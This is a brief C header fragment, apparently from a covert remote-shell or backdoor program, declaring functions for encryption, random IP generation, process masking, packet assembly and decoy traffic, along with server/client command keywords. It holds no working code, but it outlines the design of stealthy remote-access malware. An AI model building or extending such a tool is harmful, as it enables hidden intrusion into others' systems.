char *key (void);		/* Set encryption Key */
void use (char *);		/* Client Usage */
char *crypt (char *, char *, int);	/* Encryption rooteen */
char *randip ();		/* Random ip gen */
void edumask (int, char **);	/* Educated proc masking */
char *spkt (char *);		/* Packet assembly */
int decoy(unsigned long ip,char *payload);	/* decoys */

#define CLOSE "astalavista"	/* Close server */
#define EXIT "byebye"		/* Close client */
#define CD "cd"			/* change dir */
#define CLEAR "clear"		/* clear        */
#define SIGMAX 64		/* Last signal # */

#define ENCRYPT 0
#define DECRYPT 1		/* boolean encrypt args */

#define VERSION "1.48"
